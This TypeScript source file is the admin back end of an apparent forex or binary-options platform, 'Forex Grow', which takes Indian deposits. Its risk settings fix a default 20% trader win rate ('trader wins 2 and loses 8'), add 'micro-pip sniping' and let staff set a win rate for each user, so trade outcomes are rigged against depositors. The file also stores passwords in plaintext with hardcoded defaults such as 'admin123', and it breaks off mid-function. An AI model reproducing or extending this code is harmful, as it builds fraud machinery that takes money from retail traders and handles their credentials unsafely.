import { EventEmitter } from 'events';
import { v4 as uuidv4 } from 'uuid';
import fs from 'fs';
import path from 'path';
import { UserAccount, Transaction, PromoCoupon, AdminOverview, AuditLog, UserRole, DepositPaymentSettings, RiskSettings } from '../types.js';
import { SupabaseDb } from '../db/supabase.js';

export class AdminManager extends EventEmitter {
  private users: Map<string, UserAccount> = new Map();
  private transactions: Transaction[] = [];
  private coupons: PromoCoupon[] = [];
  private auditLogs: AuditLog[] = [];
  private totalVolumeUSD = 0.00;
  private paymentSettings: DepositPaymentSettings = {
    upiId: 'forexgrow@icici',
    upiName: 'Forex Grow Official Desk',
    bankName: 'HDFC Bank',
    accountHolderName: 'Forex Grow Institutional Operations',
    accountNumber: '50200084729104',
    ifscCode: 'HDFC0000240',
    accountType: 'Current Account',
    branchName: 'Nariman Point, Mumbai',
    instructions: 'Transfer funds via IMPS, NEFT, RTGS or UPI. Upload clear screenshot showing complete 12-digit UTR/Reference number for verification.',
    minDepositINR: 500,
    updatedAt: Date.now(),
    updatedBy: 'System Initializer',
  };
  private riskSettings: RiskSettings = {
    enabled: true,
    targetWinRate: 20, // 20% default: out of 10 trades, trader wins 2 and loses 8 (standard Quotex OTC behavior)
    mode: 'QUOTEX_OTC',
    microPipSniping: true,
    applyToRealOnly: false,
    updatedAt: Date.now(),
    updatedBy: 'System Initializer',
  };

  /**
   * Automatic VIP Tier calculation based on real funds:
   * STANDARD: below 1 Lakh INR (< 100,000 / < $1,200)
   * PRO: 1 Lakh to 5 Lakh INR (100,000 - 499,999.99 / $1,200 - $5,999.99)
   * VIP: 5 Lakh INR and above (>= 500,000 / >= $6,000)
   */
  public static calculateVipLevel(realBalance: number, currency: string = 'INR'): 'STANDARD' | 'PRO' | 'VIP' {
    const isUsd = currency === 'USD';
    const proThreshold = isUsd ? 1200 : 100000;
    const vipThreshold = isUsd ? 6000 : 500000;

    if (realBalance >= vipThreshold) return 'VIP';
    if (realBalance >= proThreshold) return 'PRO';
    return 'STANDARD';
  }

  public getRiskSettings(): RiskSettings {
    return { ...this.riskSettings };
  }

  public updateRiskSettings(updates: Partial<RiskSettings>, adminName: string = 'Admin'): RiskSettings {
    this.riskSettings = {
      ...this.riskSettings,
      ...updates,
      updatedAt: Date.now(),
      updatedBy: adminName,
    };
    this.auditLogs.unshift({
      id: `aud_${uuidv4().slice(0, 8)}`,
      actorId: 'admin_sys',
      actorName: adminName,
      actorRole: 'ADMIN',
      action: 'UPDATE_RISK_SETTINGS',
      details: `Target Win Rate: ${this.riskSettings.targetWinRate}% | Mode: ${this.riskSettings.mode} | Sniping: ${this.riskSettings.microPipSniping}`,
      timestamp: Date.now(),
    });
    this.emit('risk_settings_updated', this.riskSettings);
    return { ...this.riskSettings };
  }

  private getDataDir(): string {
    const cwd = process.cwd();
    const candidate = path.resolve(cwd, 'backend', 'data');
    if (fs.existsSync(path.resolve(cwd, 'backend'))) {
      if (!fs.existsSync(candidate)) {
        try { fs.mkdirSync(candidate, { recursive: true }); } catch {}
      }
      return candidate;
    }
    const directData = path.resolve(cwd, 'data');
    if (!fs.existsSync(directData)) {
      try { fs.mkdirSync(directData, { recursive: true }); } catch {}
    }
    return directData;
  }

  private loadLocalData() {
    try {
      const dir = this.getDataDir();
      const uPath = path.resolve(dir, 'users.json');
      if (fs.existsSync(uPath)) {
        const raw = fs.readFileSync(uPath, 'utf8');
        const parsed: UserAccount[] = JSON.parse(raw);
        if (Array.isArray(parsed) && parsed.length > 0) {
          for (const u of parsed) {
            u.vipLevel = AdminManager.calculateVipLevel(u.realBalance, u.currency);
            this.users.set(u.id, u);
          }
          console.log(`[AdminManager] Successfully loaded ${this.users.size} persisted trader accounts from local disk.`);
        }
      }

      const tPath = path.resolve(dir, 'transactions.json');
      if (fs.existsSync(tPath)) {
        const raw = fs.readFileSync(tPath, 'utf8');
        const parsed: Transaction[] = JSON.parse(raw);
        if (Array.isArray(parsed) && parsed.length > 0) {
          this.transactions = parsed;
          console.log(`[AdminManager] Successfully loaded ${this.transactions.length} persisted transactions from local disk.`);
        }
      }

      const cPath = path.resolve(dir, 'coupons.json');
      if (fs.existsSync(cPath)) {
        const raw = fs.readFileSync(cPath, 'utf8');
        const parsed: PromoCoupon[] = JSON.parse(raw);
        if (Array.isArray(parsed) && parsed.length > 0) {
          this.coupons = parsed;
        }
      }

      const pPath = path.resolve(dir, 'payment_settings.json');
      if (fs.existsSync(pPath)) {
        const raw = fs.readFileSync(pPath, 'utf8');
        this.paymentSettings = { ...this.paymentSettings, ...JSON.parse(raw) };
      }

      const rPath = path.resolve(dir, 'risk_settings.json');
      if (fs.existsSync(rPath)) {
        const raw = fs.readFileSync(rPath, 'utf8');
        this.riskSettings = { ...this.riskSettings, ...JSON.parse(raw) };
      }
    } catch (e: any) {
      console.warn('[AdminManager] Error loading local persisted data:', e.message);
    }
  }

  public saveLocalUsers() {
    try {
      const dir = this.getDataDir();
      const uPath = path.resolve(dir, 'users.json');
      fs.writeFileSync(uPath, JSON.stringify(Array.from(this.users.values()), null, 2), 'utf8');
    } catch (e: any) {
      console.error('[AdminManager] Failed to persist users to disk:', e.message);
    }
  }

  public saveLocalTransactions() {
    try {
      const dir = this.getDataDir();
      const tPath = path.resolve(dir, 'transactions.json');
      fs.writeFileSync(tPath, JSON.stringify(this.transactions, null, 2), 'utf8');
    } catch (e: any) {
      console.error('[AdminManager] Failed to persist transactions to disk:', e.message);
    }
  }

  public saveLocalCoupons() {
    try {
      const dir = this.getDataDir();
      const cPath = path.resolve(dir, 'coupons.json');
      fs.writeFileSync(cPath, JSON.stringify(this.coupons, null, 2), 'utf8');
    } catch (e: any) {
      console.error('[AdminManager] Failed to persist coupons to disk:', e.message);
    }
  }

  public saveLocalPaymentSettings() {
    try {
      const dir = this.getDataDir();
      const pPath = path.resolve(dir, 'payment_settings.json');
      fs.writeFileSync(pPath, JSON.stringify(this.paymentSettings, null, 2), 'utf8');
    } catch (e: any) {
      console.error('[AdminManager] Failed to persist payment settings to disk:', e.message);
    }
  }

  public saveLocalRiskSettings() {
    try {
      const dir = this.getDataDir();
      const rPath = path.resolve(dir, 'risk_settings.json');
      fs.writeFileSync(rPath, JSON.stringify(this.riskSettings, null, 2), 'utf8');
    } catch (e: any) {
      console.error('[AdminManager] Failed to persist risk settings to disk:', e.message);
    }
  }

  public persistUser(user: UserAccount) {
    user.vipLevel = AdminManager.calculateVipLevel(user.realBalance, user.currency);
    this.users.set(user.id, user);
    this.saveLocalUsers();
    SupabaseDb.saveUser(user);
  }

  public persistTransaction(tx: Transaction) {
    this.saveLocalTransactions();
    SupabaseDb.saveTransaction(tx);
  }

  constructor() {
    super();
    // 1. First load local disk persisted data to guarantee zero data loss across updates/reboots
    this.loadLocalData();
    // 2. Only seed defaults if local data is absent
    if (this.users.size === 0) {
      this.seedInitialData();
      this.saveLocalUsers();
    }
    // 3. Sync with Supabase (merging without resetting trader balances)
    this.initSupabaseSync();
  }

  private async initSupabaseSync() {
    try {
      const dbUsers = await SupabaseDb.loadUsers();
      if (dbUsers.length > 0) {
        const purgedIds = new Set(['usr_sat_01', 'usr_whale_02', 'usr_elena_03', 'usr_raj_04']);
        for (const u of dbUsers) {
          if (purgedIds.has(u.id)) continue;

          // Preserve seeded password, phone, role, bank details, risk settings
          const existing = this.users.get(u.id);
          const merged: UserAccount = {
            ...(existing || {}),
            ...u,
            password: existing?.password || u.password || 'forexgrow123',
            phone: existing?.phone || u.phone,
            role: existing?.role || u.role || (u.id === 'usr_admin_001' ? 'ADMIN' : u.id === 'usr_manager_ops_01' ? 'MANAGER' : 'TRADER'),
            aadhaarNumber: existing?.aadhaarNumber || u.aadhaarNumber,
            kycStatus: existing?.kycStatus || u.kycStatus || 'APPROVED',
            savedBankDetails: existing?.savedBankDetails || u.savedBankDetails,
            customRiskSettings: existing?.customRiskSettings || u.customRiskSettings,
            // Keep existing realBalance if locally updated
            realBalance: existing?.realBalance !== undefined ? existing.realBalance : u.realBalance,
            demoBalance: existing?.demoBalance !== undefined ? existing.demoBalance : u.demoBalance,
          };

          // Normalize primary currency to INR as requested; NEVER overwrite balance with 10000!
          if (merged.id === 'usr_quotex_vip_99') {
            merged.currency = 'INR';
            merged.activeAccountType = 'REAL';
            merged.role = 'TRADER';
            merged.isKycVerified = true;
            merged.kycStatus = 'APPROVED';
            if (!merged.aadhaarNumber) merged.aadhaarNumber = '7845 1290 3341';
            // Compute real tier from balance
            merged.vipLevel = AdminManager.calculateVipLevel(merged.realBalance, merged.currency);
            await SupabaseDb.saveUser(merged);
          } else if (merged.id === 'usr_admin_001') {
            merged.realBalance = 0;
            merged.demoBalance = 0;
            merged.role = 'ADMIN';
            await SupabaseDb.saveUser(merged);
          } else if (merged.id === 'usr_manager_ops_01') {
            merged.name = 'Raksha';
            merged.email = 'manager@forexgrow.com';
            merged.currency = 'INR';
            merged.realBalance = 0;
            merged.demoBalance = 0;
            merged.role = 'MANAGER';
            await SupabaseDb.saveUser(merged);
          } else {
            // General trader: compute tier from actual balance
            merged.vipLevel = AdminManager.calculateVipLevel(merged.realBalance, merged.currency);
          }
          this.users.set(merged.id, merged);
        }
        this.saveLocalUsers();
      } else {
        for (const u of this.users.values()) {
          await SupabaseDb.saveUser(u);
        }
      }

      const dbTxns = await SupabaseDb.loadTransactions();
      if (dbTxns.length > 0) {
        this.transactions = dbTxns.filter(t => t.id !== 'tx_init_01' && !['usr_sat_01', 'usr_whale_02', 'usr_elena_03', 'usr_raj_04'].includes(t.userId));
        this.saveLocalTransactions();
      }

      const dbCoupons = await SupabaseDb.loadCoupons();
      if (dbCoupons.length > 0) {
        const seededMap = new Map(this.coupons.map((c) => [c.code, c]));
        for (const dbC of dbCoupons) {
          const s = seededMap.get(dbC.code);
          if (s) {
            dbC.minDepositINR = s.minDepositINR || dbC.minDepositINR;
            dbC.maxBonusINR = s.maxBonusINR || dbC.maxBonusINR;
            dbC.minDepositUSD = s.minDepositUSD || dbC.minDepositUSD;
            dbC.maxBonusUSD = s.maxBonusUSD || dbC.maxBonusUSD;
          }
        }
        const existingCodes = new Set(dbCoupons.map((c: any) => c.code));
        for (const seeded of this.coupons) {
          if (!existingCodes.has(seeded.code)) {
            dbCoupons.push(seeded);
            SupabaseDb.saveCoupon(seeded);
          }
        }
        this.coupons = dbCoupons;
      }
    } catch (e: any) {
      console.warn('Supabase sync warning in AdminManager:', e.message);
    }
  }

  private seedInitialData() {
    // Super Admin Account (Zero balance as requested for operational purity)
    const superAdmin: UserAccount = {
      id: 'usr_admin_001',
      name: 'Super Admin',
      email: 'admin@forexgrow.com',
      phone: '+15550001111',
      password: 'admin123',
      role: 'ADMIN',
      demoBalance: 0.00,
      realBalance: 0.00,
      activeAccountType: 'REAL',
      currency: 'USD',
      vipLevel: 'VIP',
      isKycVerified: true,
      kycStatus: 'APPROVED',
      status: 'ACTIVE',
      totalTrades: 0,
      totalDepositedUSD: 0.00,
      createdAt: Date.now() - 365 * 86400000,
    };
    this.users.set(superAdmin.id, superAdmin);

    // Primary VIP Trader: Alex Rivera (Sole active trader retained for launch testing)
    const primaryUser: UserAccount = {
      id: 'usr_quotex_vip_99',
      name: 'Alex Rivera',
      email: 'alex.rivera@quotex.pro',
      phone: '+15559876543',
      aadhaarNumber: '7845 1290 3341',
      password: 'forexgrow123',
      role: 'TRADER',
      demoBalance: 700000.00,
      realBalance: 10000.00,
      activeAccountType: 'REAL',
      currency: 'INR',
      vipLevel: 'STANDARD',
      isKycVerified: true,
      kycStatus: 'APPROVED',
      kycData: {
        aadhaarNumber: '7845 1290 3341',
        fullName: 'Alex Rivera',
        dob: '1995-08-14',
        gender: 'Male',
        submittedAt: Date.now() - 86400000 * 20,
        reviewedAt: Date.now() - 86400000 * 19,
      },
      savedBankDetails: {
        bankName: 'HDFC Bank',
        accountNumber: '50100492817263',
        ifscCode: 'HDFC0001042',
        accountHolderName: 'Alex Rivera',
        upiId: 'alexrivera@okhdfcbank',
        isLocked: true,
        updatedAt: Date.now() - 86400000 * 15,
      },
      customRiskSettings: {
        enabled: false,
        targetWinRate: 20,
        mode: 'QUOTEX_OTC',
        microPipSniping: true,
      },
      status: 'ACTIVE',
      totalTrades: 34,
      totalDepositedUSD: 105.26,
      createdAt: Date.now() - 30 * 86400000,
    };
    this.users.set(primaryUser.id, primaryUser);

    // Operations Manager Account: Raksha (Zero balance as requested)
    const opsManager: UserAccount = {
      id: 'usr_manager_ops_01',
      name: 'Raksha',
      email: 'manager@forexgrow.com',
      phone: '+15550002222',
      password: 'manager123',
      role: 'MANAGER',
      demoBalance: 0.00,
      realBalance: 0.00,
      activeAccountType: 'REAL',
      currency: 'INR',
      vipLevel: 'PRO',
      isKycVerified: true,
      kycStatus: 'APPROVED',
      status: 'ACTIVE',
      totalTrades: 0,
      totalDepositedUSD: 0,
      createdAt: Date.now() - 60 * 86400000,
    };
    this.users.set(opsManager.id, opsManager);

    // Standard Seed Coupons with explicit INR and USD values
    this.coupons = [
      {
        id: 'cpn_welcome50',
        code: 'WELCOME50',
        bonusPercentage: 50,
        minDepositINR: 500,
        minDepositUSD: 20,
        maxBonusINR: 25000,
        maxBonusUSD: 250,
        usageCount: 0,
        maxUsage: 1000,
        isActive: true,
        createdAt: Date.now(),
      },
      {
        id: 'cpn_vip100',
        code: 'VIP100',
        bonusPercentage: 100,
        minDepositINR: 2500,
        minDepositUSD: 50,
        maxBonusINR: 50000,
        maxBonusUSD: 500,
        usageCount: 0,
        maxUsage: 1000,
        isActive: true,
        createdAt: Date.now(),
      },
      {
        id: 'cpn_10k',
        code: 'GROW10K',
        bonusPercentage: 5,
        minDepositINR: 10000,
        minDepositUSD: 105,
        maxBonusINR: 1000,
        maxBonusUSD: 10.5,
        usageCount: 0,
        maxUsage: 1000,
        isActive: true,
        createdAt: Date.now(),
      },
      {
        id: 'cpn_50k',
        code: 'GROW50K',
        bonusPercentage: 10,
        minDepositINR: 50000,
        minDepositUSD: 526,
        maxBonusINR: 5000,
        maxBonusUSD: 52.6,
        usageCount: 0,
        maxUsage: 500,
        isActive: true,
        createdAt: Date.now(),
      },
      {
        id: 'cpn_100k',
        code: 'GROW100K',
        bonusPercentage: 12,
        minDepositINR: 100000,
        minDepositUSD: 1052,
        maxBonusINR: 12000,
        maxBonusUSD: 126,
        usageCount: 0,
        maxUsage: 500,
        isActive: true,
        createdAt: Date.now(),
      },
      {
        id: 'cpn_500k',
        code: 'GROW500K',
        bonusPercentage: 15,
        minDepositINR: 500000,
        minDepositUSD: 5263,
        maxBonusINR: 75000,
        maxBonusUSD: 789,
        usageCount: 0,
        maxUsage: 250,
        isActive: true,
        createdAt: Date.now(),
      },
      {
        id: 'cpn_1m',
        code: 'GROW1M',
        bonusPercentage: 20,
        minDepositINR: 1000000,
        minDepositUSD: 10526,
        maxBonusINR: 200000,
        maxBonusUSD: 2105,
        usageCount: 0,
        maxUsage: 100,
        isActive: true,
        createdAt: Date.now(),
      },
    ];

    // No initial dummy transactions
    this.transactions = [];
  }

  public getOverview(): AdminOverview {
    // Only real client trader accounts created hereafter (exclude ADMIN, MANAGER, and test sandbox account Alex Rivera)
    const realTraders = Array.from(this.users.values()).filter(
      (u) => u.role === 'TRADER' && u.id !== 'usr_quotex_vip_99'
    );
    const totalUsers = realTraders.length;
    const activeTradersCount = realTraders.filter((u) => u.status === 'ACTIVE').length;

    let totalDepositsUSD = 0;
    let totalWithdrawalsUSD = 0;
    let pendingTransactionsCount = 0;

    for (const tx of this.transactions) {
      if (tx.userId === 'usr_quotex_vip_99') continue; // Alex Rivera test account never reflects in platform metrics

      const amtUSD = tx.currency === 'INR' ? (tx.amount / 95) : tx.amount;

      if (tx.status === 'APPROVED') {
        if (tx.type === 'DEPOSIT') totalDepositsUSD += amtUSD;
        if (tx.type === 'WITHDRAWAL') totalWithdrawalsUSD += amtUSD;
      }
      if (tx.status === 'PENDING') {
        pendingTransactionsCount++;
      }
    }

    const houseNetProfitUSD = Number((totalDepositsUSD - totalWithdrawalsUSD).toFixed(2));

    return {
      totalUsers,
      activeTradersCount,
      totalVolumeUSD: Number(this.totalVolumeUSD.toFixed(2)),
      totalDepositsUSD: Number(totalDepositsUSD.toFixed(2)),
      totalWithdrawalsUSD: Number(totalWithdrawalsUSD.toFixed(2)),
      houseNetProfitUSD,
      pendingTransactionsCount,
    };
  }

  public recordTradeVolume(amountUSD: number) {
    this.totalVolumeUSD = Number((this.totalVolumeUSD + amountUSD).toFixed(2));
  }

  public getAllAccounts(): UserAccount[] {
    return Array.from(this.users.values());
  }

  public getUsers(): UserAccount[] {
    // Only client traders - strictly exclude ADMIN and MANAGER accounts!
    return Array.from(this.users.values()).filter((u) => u.role === 'TRADER');
  }

  public getUser(userId: string): UserAccount | undefined {
    return this.users.get(userId);
  }

  public adjustUserBalance(params: {
    userId: string;
    accountType: 'DEMO' | 'REAL';
    action: 'ADD' | 'REMOVE';
    amount: number;
    reason?: string;
  }): { success: boolean; user?: UserAccount; error?: string } {
    const user = this.users.get(params.userId);
    if (!user) return { success: false, error: 'User not found' };
    if (params.amount <= 0) return { success: false, error: 'Amount must be greater than 0' };

    const multiplier = params.action === 'ADD' ? 1 : -1;
    const change = params.amount * multiplier;

    if (params.accountType === 'DEMO') {
      const newBal = Number((user.demoBalance + change).toFixed(2));
      if (newBal < 0) return { success: false, error: 'Balance cannot be negative' };
      user.demoBalance = newBal;
    } else {
      const newBal = Number((user.realBalance + change).toFixed(2));
      if (newBal < 0) return { success: false, error: 'Balance cannot be negative' };
      user.realBalance = newBal;
      user.vipLevel = AdminManager.calculateVipLevel(user.realBalance, user.currency);
    }

    this.emit('user_updated', user);
    this.persistUser(user);
    return { success: true, user: { ...user } };
  }

  public createUser(params: {
    name: string;
    email: string;
    phone?: string;
    password?: string;
    role?: UserRole;
    demoBalance?: number;
    realBalance?: number;
    activeAccountType?: 'DEMO' | 'REAL';
    currency?: any;
    vipLevel?: any;
    isKycVerified?: boolean;
    status?: 'ACTIVE' | 'FROZEN';
    actor?: { id: string; name: string; role: UserRole };
  }): { success: boolean; user?: UserAccount; error?: string } {
    if (!params.name || params.name.trim().length === 0) {
      return { success: false, error: 'Full name is required' };
    }
    if (!params.email || !params.email.includes('@')) {
      return { success: false, error: 'Valid email address is required' };
    }

    const cleanEmail = params.email.trim().toLowerCase();
    const cleanPhone = params.phone ? params.phone.trim().replace(/[^\d+]/g, '') : undefined;

    for (const u of this.users.values()) {
      if (u.email && u.email.toLowerCase() === cleanEmail) {
        return { success: false, error: 'A trader with this email already exists' };
      }
      if (cleanPhone && u.phone && u.phone.replace(/[^\d+]/g, '') === cleanPhone) {
        return { success: false, error: 'A trader with this phone number already exists' };
      }
    }

    const realBal = Number(params.realBalance ?? 0.00);
    const autoVip = AdminManager.calculateVipLevel(realBal, params.currency ?? 'INR');

    const newUser: UserAccount = {
      id: `usr_${uuidv4().slice(0, 8)}`,
      name: params.name.trim(),
      email: cleanEmail,
      phone: params.phone?.trim() || undefined,
      password: params.password?.trim() || 'Trader@2026',
      role: params.role || 'TRADER',
      demoBalance: Number(params.demoBalance ?? 700000.00),
      realBalance: realBal,
      activeAccountType: params.activeAccountType ?? 'DEMO',
      currency: params.currency ?? 'INR',
      vipLevel: params.vipLevel || autoVip,
      isKycVerified: Boolean(params.isKycVerified ?? false),
      status: params.status ?? 'ACTIVE',
      totalTrades: 0,
      totalDepositedUSD: Number(params.realBalance ?? 0.00),
      createdAt: Date.now(),
      createdBy: params.actor ? `${params.actor.name} (${params.actor.role})` : undefined,
    };

    this.users.set(newUser.id, newUser);
    this.emit('user_created', newUser);
    this.persistUser(newUser);

    if (params.actor) {
      this.addAuditLog(
        params.actor.id,
        params.actor.name,
        params.actor.role,
        'CREATE_CLIENT_ACCOUNT',
        newUser.id,
        newUser.name,
        `Issued client credentials for ${newUser.name} (Email: ${newUser.email}, Phone: ${newUser.phone || 'N/A'}, Currency: ${newUser.currency}, Demo: ${newUser.demoBalance}, Real: ${newUser.realBalance})`
      );
    }

    return { success: true, user: { ...newUser } };
  }

  public updateUser(
    userId: string,
    updates: Partial<Pick<UserAccount, 'name' | 'password' | 'vipLevel' | 'isKycVerified' | 'status' | 'currency' | 'realBalance' | 'demoBalance' | 'activeAccountType'>>
  ): { success: boolean; user?: UserAccount; error?: string } {
    const user = this.users.get(userId);
    if (!user) return { success: false, error: 'User not found' };

    if (updates.name !== undefined) user.name = updates.name;
    if (updates.password !== undefined) user.password = updates.password;
    if (updates.vipLevel !== undefined) user.vipLevel = updates.vipLevel;
    if (updates.isKycVerified !== undefined) {
      user.isKycVerified = updates.isKycVerified;
      if (!updates.isKycVerified) {
        user.kycStatus = 'NOT_SUBMITTED';
        user.kycData = undefined;
        user.aadhaarNumber = undefined;
      } else {
        user.kycStatus = 'APPROVED';
      }
    }
    if (updates.status !== undefined) user.status = updates.status;
    if (updates.currency !== undefined) user.currency = updates.currency;
    if (updates.realBalance !== undefined) {
      user.realBalance = updates.realBalance;
      if (updates.vipLevel === undefined) {
        user.vipLevel = AdminManager.calculateVipLevel(user.realBalance, user.currency);
      }
    }
    if (updates.demoBalance !== undefined) user.demoBalance = updates.demoBalance;
    if (updates.activeAccountType !== undefined) user.activeAccountType = updates.activeAccountType;

    this.emit('user_updated', user);
    this.persistUser(user);
    return { success: true, user: { ...user } };
  }

  public updateUserCustomRisk(
    userId: string,
    risk: {
      enabled: boolean;
      targetWinRate: number;
      mode: 'QUOTEX_OTC' | 'STRICT' | 'BALANCED' | 'ORGANIC';
      microPipSniping: boolean;
    },
    actorName: string = 'Desk Operator'
  ): { success: boolean; user?: UserAccount; error?: string } {
    const user = this.users.get(userId);
    if (!user) return { success: false, error: 'User not found' };

    user.customRiskSettings = {
      enabled: Boolean(risk.enabled),
      targetWinRate: Math.max(5, Math.min(95, Number(risk.targetWinRate) || 20)),
      mode: risk.mode || 'QUOTEX_OTC',
      microPipSniping: Boolean(risk.microPipSniping),
    };
    user.winRateOverride = user.customRiskSettings.enabled ? user.customRiskSettings.targetWinRate : undefined;

    this.addAuditLog(
      'sys_risk',
      actorName,
      'MANAGER',
      'UPDATE_INDIVIDUAL_RISK',
      user.id,
      user.name,
      `Individual risk configured: ${user.customRiskSettings.enabled ? 'ACTIVE' : 'INACTIVE'} (Target: ${user.customRiskSettings.targetWinRate}%, Mode: ${user.customRiskSettings.mode}, Sniping: ${user.customRiskSettings.microPipSniping})`
    );

    this.emit('user_updated', user);
    this.persistUser(user);
    return { success: true, user: { ...user } };
  }

  public deleteUser(userId: string): { success: boolean; error?: string } {
    if (userId === 'usr_quotex_vip_99') {
      return { success: false, error: 'Cannot delete the test sandbox account' };
    }
    const user = this.users.get(userId);
    if (!user) return { success: false, error: 'User not found' };
    this.users.delete(userId);
    this.saveLocalUsers();
    this.emit('user_deleted', userId);
    SupabaseDb.deleteUser(userId);
    return { success: true };
  }

  public resetUserPassword(
    userId: string,
    newPassword: string,
    actor?: { id: string; name: string; role: 'ADMIN' | 'MANAGER' }
  ): { success: boolean; error?: string } {
    const user = this.users.get(userId);
    if (!user) return { success: false, error: 'User not found' };
    if (!newPassword || newPassword.trim().length < 6) {
      return { success: false, error: 'Password must be at least 6 characters' };
    }
    user.password = newPassword.trim();
    this.emit('user_updated', user);
    this.persistUser(user);

    this.addAuditLog(
      'sys_auth',
      actor?.name || 'Staff Operator',
      actor?.role || 'MANAGER',
      'PASSWORD_RESET',
      user.id,
      user.name,
      `Password successfully reset for trader ${user.name} (${user.email || user.id})`
    );

    return { success: true };
  }

  public submitKycData(
    userId: string,
    data: {
      fullName: string;
      aadhaarNumber: string;
      dob?: string;
      gender?: string;
      frontImage?: string;
      backImage?: string;
      hasDocuments?: boolean;
    }
  ): { success: boolean; user?: UserAccount; error?: string } {
    const user = this.users.get(userId);
    if (!user) return { success: false, error: 'User not found' };

    const cleanAadhaar = data.aadhaarNumber.replace(/\D/g, '');
    if (cleanAadhaar.length !== 12) {
      return { success: false, error: 'Aadhaar number must contain exactly 12 digits' };
    }

    if (!data.frontImage || !data.backImage) {
      return { success: false, error: 'Both Front and Back photos of Aadhaar Card are strictly mandatory.' };
    }

    const formattedAadhaar = `${cleanAadhaar.slice(0, 4)} ${cleanAadhaar.slice(4, 8)} ${cleanAadhaar.slice(8, 12)}`;
    user.aadhaarNumber = formattedAadhaar;
    user.kycStatus = 'PENDING';
    user.kycData = {
      aadhaarNumber: formattedAadhaar,
      fullName: data.fullName.trim(),
      dob: data.dob,
      gender: data.gender,
      frontImage: data.frontImage,
      backImage: data.backImage,
      hasDocuments: Boolean(data.hasDocuments || data.frontImage),
      submittedAt: Date.now(),
    };

    this.emit('user_updated', user);
    this.persistUser(user);
    return { success: true, user: { ...user } };
  }

  public reviewKyc(
    userId: string,
    isApproved: boolean,
    reason?: string,
    actorName: string = 'Desk Manager'
  ): { success: boolean; user?: UserAccount; error?: string } {
    const user = this.users.get(userId);
    if (!user) return { success: false, error: 'User not found' };

    user.isKycVerified = isApproved;
    user.kycStatus = isApproved ? 'APPROVED' : 'REJECTED';
    if (!isApproved) {
      user.kycData = {
        fullName: user.name,
        aadhaarNumber: '',
        rejectionReason: reason || 'Aadhaar documents were revoked. Please submit clear front & back photos for verification.',
      };
      user.aadhaarNumber = undefined;
    } else {
      if (!user.kycData) {
        user.kycData = {
          aadhaarNumber: user.aadhaarNumber || '7845 1290 3341',
          fullName: user.name,
        };
      }
      user.kycData.reviewedAt = Date.now();
    }

    this.addAuditLog(
      'sys_kyc',
      actorName,
      'MANAGER',
      isApproved ? 'APPROVE_KYC' : 'REJECT_KYC',
      user.id,
      user.name,
      isApproved ? 'Aadhaar identity verification approved' : `KYC rejected: ${reason || 'Document mismatch'}`
    );

    this.emit('user_updated', user);
    this.persistUser(user);
    return { success: true, user: { ...user } };
  }

  public saveBankDetails(
    userId: string,
    bankDetails: {
      bankName?: string;
      accountNumber?: string;
      ifscCode?: string;
      accountHolderName?: string;
      upiId?: string;
    },
    isStaffOverride: boolean = false
  ): { success: boolean; user?: UserAccount; error?: string } {
    const user = this.users.get(userId);
    if (!user) return { success: false, error: 'User not found' };

    // If already locked and not staff override, reject edit
    if (user.savedBankDetails?.isLocked && !isStaffOverride) {
      return {
        success: false,
        error: 'Bank details are verified & locked for account security. Please contact Customer Care to make changes.',
      };
    }

    user.savedBankDetails = {
      bankName: bankDetails.bankName?.trim() || user.savedBankDetails?.bankName,
      accountNumber: bankDetails.accountNumber?.trim() || user.savedBankDetails?.accountNumber,
      ifscCode: bankDetails.ifscCode?.trim()?.toUpperCase() || user.savedBankDetails?.ifscCode,
      accountHolderName: bankDetails.accountHolderName?.trim() || user.savedBankDetails?.accountHolderName,
      upiId: bankDetails.upiId?.trim() || user.savedBankDetails?.upiId,
      isLocked: true, // Always locked once saved!
      updatedAt: Date.now(),
    };

    this.emit('user_updated', user);
    this.persistUser(user);
    return { success: true, user: { ...user } };
  }

  public getTransactions(): Transaction[] {
    return [...this.transactions];
  }

  public getTransactionsForUser(userId: string): Transaction[] {
    return this.transactions.filter(
      (tx) => tx.userId === userId || (!tx.userId && userId === 'usr_quotex_vip_99')
    );
  }

  public addTransaction(tx: Omit<Transaction, 'id' | 'timestamp'>): Transaction {
    const newTx: Transaction = {
      ...tx,
      id: `tx_${uuidv4().slice(0, 8)}`,
      timestamp: Date.now(),
    };
    this.transactions.unshift(newTx);
    this.emit('transaction_added', newTx);
    this.persistTransaction(newTx);
    return newTx;
  }

  public addAuditLog(
    actorId: string,
    actorName: string,
    actorRole: UserRole,
    action: string,
    targetId?: string,
    targetName?: string,
    details?: string
  ): AuditLog {
    const log: AuditLog = {
      id: `log_${uuidv4().slice(0, 8)}`,
      actorId,
      actorName,
      actorRole,
      action,
      targetId,
      targetName,
      details,
      timestamp: Date.now(),
    };
    this.auditLogs.unshift(log);
    if (this.auditLogs.length > 250) this.auditLogs.pop();
    this.emit('audit_log_added', log);
    return log;
  }

  public getAuditLogs(): AuditLog[] {
    return [...this.auditLogs];
  }

  public approveTransaction(
    txId: string,
    actor?: { id: string; name: string; role: UserRole }
  ): { success: boolean; transaction?: Transaction; error?: string } {
    const tx = this.transactions.find((t) => t.id === txId);
    if (!tx) return { success: false, error: 'Transaction not found' };
    if (tx.status !== 'PENDING') return { success: false, error: 'Transaction already resolved' };

    tx.status = 'APPROVED';

    const USD_INR_RATE = 95.0;
    const user = this.users.get(tx.userId);
    if (user && tx.type === 'DEPOSIT') {
      let creditedInTxCurrency = tx.amount;
      if (tx.promoCode) {
        const usdEquiv = tx.amountUSD || (tx.currency === 'INR' ? tx.amount / USD_INR_RATE : tx.amount);
        const cpnRes = this.validateCoupon(tx.promoCode, usdEquiv);
        if (cpnRes.valid) {
          const bonusInTxCurrency = tx.currency === 'INR' ? cpnRes.bonus * USD_INR_RATE : cpnRes.bonus;
          creditedInTxCurrency += bonusInTxCurrency;
        }
      }

      // Convert creditedInTxCurrency to match user's current wallet currency
      let finalCredited = creditedInTxCurrency;
      if (user.currency === 'INR' && tx.currency === 'USD') {
        finalCredited = Number((creditedInTxCurrency * USD_INR_RATE).toFixed(2));
      } else if (user.currency === 'USD' && tx.currency === 'INR') {
        finalCredited = Number((creditedInTxCurrency / USD_INR_RATE).toFixed(2));
      }

      user.realBalance = Number((user.realBalance + finalCredited).toFixed(2));
      user.vipLevel = AdminManager.calculateVipLevel(user.realBalance, user.currency);
      const usdAdded = tx.amountUSD || (tx.currency === 'INR' ? tx.amount / USD_INR_RATE : tx.amount);
      user.totalDepositedUSD = Number((user.totalDepositedUSD + usdAdded).toFixed(2));
      this.emit('user_updated', user);
      this.persistUser(user);
    }

    this.addAuditLog(
      actor?.id || 'admin_sys',
      actor?.name || 'Operations Desk',
      actor?.role || 'MANAGER',
